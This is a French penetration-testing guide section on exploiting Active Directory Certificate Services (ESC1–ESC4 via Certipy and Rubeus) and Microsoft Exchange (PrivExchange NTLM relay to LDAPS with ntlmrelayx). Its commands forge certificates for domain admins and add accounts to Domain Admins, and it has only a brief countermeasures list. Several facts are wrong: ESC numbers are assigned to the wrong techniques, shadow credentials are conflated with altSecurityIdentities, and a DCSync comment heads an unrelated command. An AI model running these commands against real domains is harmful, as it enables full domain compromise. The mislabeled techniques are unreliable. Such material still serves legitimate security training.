# V.D. Exploitation de Services (Exchange, ADCS, etc.)

Certains services étroitement intégrés à Active Directory, comme Microsoft Exchange ou Active Directory Certificate Services (AD CS), peuvent présenter des vulnérabilités ou des configurations faibles menant à une élévation de privilèges.

## 1. Active Directory Certificate Services (AD CS)

Des configurations incorrectes d'AD CS peuvent permettre à un attaquant d'obtenir des certificats au nom d'autres utilisateurs (y compris des admins) ou d'ordinateurs, menant à une compromission totale du domaine.
Voir la section [IV.C Énumération ADCS](../04-post-compromission/C-enumeration-adcs.md) pour l'identification des vulnérabilités (ESC1 à ESC8+).

*   **Exploitation avec Certipy :**
    Certipy est l'outil principal pour exploiter les failles AD CS.

    *   **ESC1 (SAN mal configuré + Authentification Client) :**
        ```bash
        # Demander un certificat pour un template vulnérable (ex: VulnTemplate) en spécifiant un SAN pour un admin (ex: domainadmin)
        certipy req -u <ATTAQUANT_USER>@<DOMAINE> -p <ATTAQUANT_PASS> -ca <NOM_CA> -target <DC_IP> -template VulnTemplate -upn domainadmin@<DOMAINE> -dns <NOM_DC>.<DOMAINE>
        # Le certificat et la clé privée sont sauvegardés (ex: domainadmin.pfx)
        # Convertir en .pem si nécessaire pour certains outils
        # openssl pkcs12 -in domainadmin.pfx -out domainadmin.pem -nodes

        # S'authentifier avec le certificat (ex: avec Rubeus ou certipy auth)
        certipy auth -pfx domainadmin.pfx -dc-ip <DC_IP>
        # Ou avec Rubeus pour obtenir un TGT
        # Rubeus.exe asktgt /user:domainadmin /certificate:domainadmin.pfx /password:<MOT_DE_PASSE_PFX_SI_DEFINI> /ptt
        ```

    *   **ESC2 (Agent d'Inscription) :**
        Si l'attaquant contrôle un compte agent d'inscription ou un template permettant l'inscription pour le compte d'autrui.
        ```bash
        # Demander un certificat pour 'cible_user' via le template 'EnrollmentAgentTemplate' au nom de 'agent_user'
        certipy req -u agent_user@<DOMAINE> -p <AGENT_PASS> -ca <NOM_CA> -target <DC_IP> -template User -on-behalf-of <DOMAINE>\cible_user
        # S'authentifier ensuite avec le certificat de cible_user.
        ```

    *   **ESC3 (Permissions de modification sur un Template) :**
        1.  Modifier le template pour le rendre vulnérable à ESC1 (ajouter l'EKU Authentification Client, permettre au demandeur de spécifier le SAN).
            ```bash
            # Exemple conceptuel avec certipy (les commandes exactes peuvent varier)
            # certipy template -template <NOM_TEMPLATE> -save-old # Sauvegarder l'ancienne config
            # certipy template -template <NOM_TEMPLATE> -add-eku "Client Authentication" -set-flag "ENROLLEE_SUPPLIES_SUBJECT"
            ```
        2.  Exploiter comme ESC1.
        3.  Restaurer le template.

    *   **ESC4 (WriteDacl sur utilisateur/ordinateur + Template d'auth client) :**
        1.  Demander un certificat pour soi-même via un template permettant l'authentification client.
        2.  Ajouter le certificat à l'attribut `altSecurityIdentities` de l'utilisateur/ordinateur cible sur lequel on a `WriteDacl`.
            ```powershell
            # Obtenir le certificat (X509:<I>Issuer<S>Subject)
            # $cert = Get-PfxCertificate -FilePath .\mycert.pfx
            # $altSecId = "X509:<I>$($cert.Issuer)<S>$($cert.Subject)"
            # Set-ADUser <UTILISATEUR_CIBLE> -Add @{'altSecurityIdentities'=$altSecId}
            # Ou avec certipy shadowcred
            certipy shadowcred -u <ATTAQUANT_USER>@<DOMAINE> -p <ATTAQUANT_PASS> -target-user <CIBLE_USER> -pfx <ATTAQUANT_CERT.pfx> -dc-ip <DC_IP>
            ```
        3.  S'authentifier en tant que l'utilisateur cible avec le certificat.

    *   **Autres vulnérabilités (ESC6, ESC7, ESC8, etc.) :** Se référer à la documentation de Certipy et aux articles de recherche de SpecterOps.

## 2. Microsoft Exchange

Exchange est profondément intégré à AD et possède des privilèges élevés. Des vulnérabilités ou des configurations spécifiques peuvent être exploitées.

*   **PrivExchange (CVE-2018-8581 et relais NTLM vers LDAP) :**
    *   **Principe :** Un utilisateur Exchange avec une boîte aux lettres peut forcer le serveur Exchange à s'authentifier auprès d'une machine contrôlée par l'attaquant via HTTP (PushSubscription). L'attaquant relaie cette authentification NTLM du compte machine Exchange vers LDAP(S) pour effectuer des actions privilégiées (ex: DCSync si Exchange a les droits, ou ajouter un utilisateur à un groupe privilégié).
    *   **Outils :** `ntlmrelayx.py` (Impacket), `PrivExchange.py` ou scripts PowerShell.
    *   **Étapes (simplifié) :**
        1.  L'attaquant a des credentials pour un utilisateur avec une boîte aux lettres.
        2.  Configurer `ntlmrelayx.py` pour relayer vers LDAPS et effectuer une action (ex: `secretsdump.py` pour DCSync, ou ajouter un compte à Domain Admins).
            ```bash
            # Relais pour DCSync (si Exchange a les droits)
            sudo ntlmrelayx.py -t ldaps://<IP_DC> --remove-mic --escalate-user NOUVEL_ADMIN_DA
            # Ou pour ajouter un compte à un groupe
            # sudo ntlmrelayx.py -t ldaps://<IP_DC> --add-group-member "Domain Admins" "DOMAINE\utilisateur_a_ajouter"
            ```
        3.  Utiliser un outil comme `privexchange.py` pour déclencher l'authentification du serveur Exchange vers l'IP de l'attaquant où `ntlmrelayx.py` écoute.
            ```python
            python privexchange.py -ah <IP_ATTAQUANT> -u <USER_EXCHANGE> -p <PASS_EXCHANGE> <IP_EXCHANGE_SERVER>
            ```
    *   **Contre-mesures :** Activer LDAP Signing & Channel Binding, EPA sur Exchange, patcher CVE-2018-8581, réduire les privilèges du groupe "Exchange Windows Permissions" (notamment le droit `WriteDacl` sur l'objet Domaine).

*   **RBAC (Role Based Access Control) dans Exchange :**
    *   Des utilisateurs peuvent avoir des rôles administratifs Exchange qui leur permettent d'effectuer des actions sensibles (ex: `Mailbox Import Export` pour lire les emails d'autres utilisateurs, `ApplicationImpersonation` pour accéder aux boîtes aux lettres).
    *   **Énumération :**
        ```powershell
        # Depuis une session PowerShell Exchange Management Shell
        Get-ManagementRoleAssignment -RoleAssignee <UTILISATEUR>
        # Lister les membres d'un rôle
        Get-RoleGroupMember "Organization Management"
        ```
    *   **Exploitation :** Utiliser les cmdlets Exchange correspondantes.

*   **Autres Vulnérabilités Exchange (ProxyLogon, ProxyShell, etc.) :**
    Ces vulnérabilités permettent souvent un accès initial ou une exécution de code à distance sur le serveur Exchange. Une fois sur le serveur, le compte machine Exchange (souvent membre de "Exchange Servers" et "Exchange Trusted Subsystem") a des privilèges élevés dans AD.

## 3. Autres Services
*   **SQL Server avec des liens vers AD :** Des SQL Servers mal configurés ou avec des comptes de service privilégiés peuvent être des points d'entrée.
*   **SCCM (System Center Configuration Manager) :** Peut être utilisé pour déployer des logiciels (et donc du code) sur des machines. Un accès admin à SCCM peut mener à une compromission à grande échelle.

**Stratégie Générale :**
1.  Identifier les services critiques intégrés à AD.
2.  Énumérer leurs configurations et permissions.
3.  Rechercher des vulnérabilités connues ou des mauvaises configurations spécifiques à ces services.
4.  Utiliser des outils spécialisés pour l'exploitation. 